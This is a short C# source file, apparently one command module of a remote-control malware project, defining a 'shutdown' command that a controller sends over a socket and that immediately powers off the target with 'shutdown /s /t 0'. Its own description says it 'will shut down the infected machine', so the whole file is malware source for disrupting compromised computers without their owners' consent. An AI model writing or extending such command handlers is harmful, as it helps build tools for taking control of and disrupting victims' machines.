using Common.Attributes;
using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Runtime.Serialization;

namespace Common.Commands.Executer_Commands
{
    [Serializable]
    [CommandName("shutdown")]
    public class ShutDown_Command : Executer
    {
        // <summary>
        /// Execute the shutdown command
        /// </summary>
        public void Execute(Socket sendTo)
        {
            try
            {
                Process.Start("shutdown", "/s /t 0");
            }
            catch(Exception ex)
            {
                Console.WriteLine("Error occured while executing shutdown command!\n{0}", ex.ToString());
            }
        }

        /// <summary>
        /// Print the command description (what it does)
        /// </summary>
        public void PrintDescription()
        {
            Console.WriteLine("This command will shut down the infected machine");
        }
    }
}
